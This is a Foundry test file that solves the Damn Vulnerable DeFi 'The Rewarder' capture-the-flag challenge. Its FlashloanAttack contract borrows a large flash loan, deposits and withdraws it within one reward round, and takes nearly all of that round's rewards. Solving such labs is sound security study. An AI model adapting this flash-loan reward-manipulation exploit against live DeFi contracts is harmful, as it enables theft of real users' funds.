// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";

contract TheRewarder is Test {
    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 internal constant USER_DEPOSIT = 100e18;

    Utilities internal utils;
    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal theRewarderPool;
    DamnValuableToken internal dvt;
    address payable[] internal users;
    address payable internal attacker;
    address payable internal alice;
    address payable internal bob;
    address payable internal charlie;
    address payable internal david;

    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(5);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];
        attacker = users[4];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");
        vm.label(attacker, "Hacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT Token");

        flashLoanerPool = new FlashLoanerPool(address(dvt));
        vm.label(address(flashLoanerPool), "Flash Loan Pool");

        dvt.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);

        theRewarderPool = new TheRewarderPool(address(dvt));
        vm.label(address(theRewarderPool), "Rewarder Pool");

        // Users deposit
        for (uint8 i; i < 4; i++) {
            dvt.transfer(users[i], USER_DEPOSIT);
            vm.startPrank(users[i]);
            dvt.approve(address(theRewarderPool), USER_DEPOSIT);
            theRewarderPool.deposit(USER_DEPOSIT);
            assertEq(theRewarderPool.accToken().balanceOf(users[i]), USER_DEPOSIT);
            vm.stopPrank();
        }

        assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * 4);
        assertEq(theRewarderPool.rewardToken().totalSupply(), 0);

        vm.warp(block.timestamp + 5 days);

        for (uint8 i; i < 4; i++) {
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            assertEq(
                theRewarderPool.rewardToken().balanceOf(users[i]),
                25e18
            );
        }

        assertEq(theRewarderPool.rewardToken().totalSupply(), 100e18);
        assertEq(dvt.balanceOf(attacker), 0);
        assertEq(theRewarderPool.roundNumber(), 2);

        console.log("Setup complete. Reward distribution initialized.");
    }

    function testTheRewarderExploit() public {
        /**
         * EXPLOIT START
         */
        vm.warp(block.timestamp + 5 days);

        vm.startPrank(attacker);

        console.log("Attacker reward balance BEFORE:",
            theRewarderPool.rewardToken().balanceOf(attacker)
        );

        FlashloanAttack attack = new FlashloanAttack(
            attacker,
            address(theRewarderPool),
            address(flashLoanerPool),
            address(dvt)
        );

        attack.attack();

        console.log("Attacker reward balance AFTER:",
            theRewarderPool.rewardToken().balanceOf(attacker)
        );

        vm.stopPrank();
        /**
         * EXPLOIT END
         */

        validation();

        console.log("Exploit successful. Rewards captured.");
    }

    function validation() internal {
        assertEq(theRewarderPool.roundNumber(), 3);

        for (uint8 i; i < 4; i++) {
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(users[i]);
            uint256 delta = rewardPerUser - 25e18;
            assertLt(delta, 1e16);
        }

        assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);

        uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(attacker);
        uint256 deltaAttacker = 100e18 - rewardAttacker;
        assertLt(deltaAttacker, 1e17);

        assertEq(dvt.balanceOf(attacker), 0);
    }
}

contract FlashloanAttack {
    TheRewarderPool rewarderPool;
    FlashLoanerPool flashloan;
    DamnValuableToken dvt;
    address attacker;

    constructor(
        address _attacker,
        address theRewarderPool,
        address _flashloan,
        address _dvt
    ) {
        attacker = _attacker;
        rewarderPool = TheRewarderPool(theRewarderPool);
        flashloan = FlashLoanerPool(_flashloan);
        dvt = DamnValuableToken(_dvt);
    }

    function attack() external {
        flashloan.flashLoan(1_000_000e18);
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);

        rewarderPool.rewardToken().transfer(
            attacker,
            rewarderPool.rewardToken().balanceOf(address(this))
        );

        dvt.transfer(address(flashloan), amount);
    }
}